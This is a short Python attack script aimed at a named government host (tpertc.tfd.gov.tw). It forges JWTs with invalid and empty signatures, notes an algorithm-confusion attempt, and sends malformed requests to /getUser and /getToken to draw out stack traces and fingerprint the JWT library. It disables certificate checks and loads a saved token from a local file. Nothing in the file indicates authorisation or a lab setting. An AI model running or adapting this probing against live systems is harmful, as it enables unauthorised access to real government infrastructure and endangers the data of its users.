import requests
import urllib3
import json
import base64

urllib3.disable_warnings()

base = "https://tpertc.tfd.gov.tw:8787"
token = open("/mnt/c/Users/Administrator/Desktop/JySecAI/erpc/data/femet_jwt.txt").read().strip()


def b64url_encode(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    encoded = base64.urlsafe_b64encode(raw).decode()
    return encoded.replace("=", "")


# Test invalid JWT to trigger error stack trace
fake_payload = {"id": 1, "iat": 1789436435}
fake_header = {"alg": "HS256", "typ": "JWT"}
fake_token = b64url_encode(fake_header) + "." + b64url_encode(fake_payload) + ".invalid"

r = requests.get(f"{base}/getUser",
    headers={"Authorization": f"Bearer {fake_token}"},
    verify=False, timeout=10)
print(f"Fake sig getUser: {r.status_code}")
print(f"Body: {r.text[:800]}")

# Test with algorithm confusion (RS256 -> HS256)
# Try JWT with empty signature
empty_sig = b64url_encode(fake_header) + "." + b64url_encode(fake_payload) + "."
r = requests.get(f"{base}/getUser",
    headers={"Authorization": f"Bearer {empty_sig}"},
    verify=False, timeout=10)
print(f"\nEmpty sig getUser: {r.status_code}")
print(f"Body: {r.text[:300]}")

# Try to discover the JWT library being used - check error messages
# Try /getToken with various content types to trigger different errors
r = requests.post(f"{base}/getToken",
    data="not_json_or_form",
    headers={"Content-Type": "text/plain"},
    verify=False, timeout=10)
print(f"\nPlain text getToken: {r.status_code}")
print(f"Body: {r.text[:500]}")

# Try with form data and missing fields
r = requests.post(f"{base}/getToken",
    data="account_name=",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    verify=False, timeout=10)
print(f"\nMissing password: {r.status_code}")
print(f"Body: {r.text[:200]}")
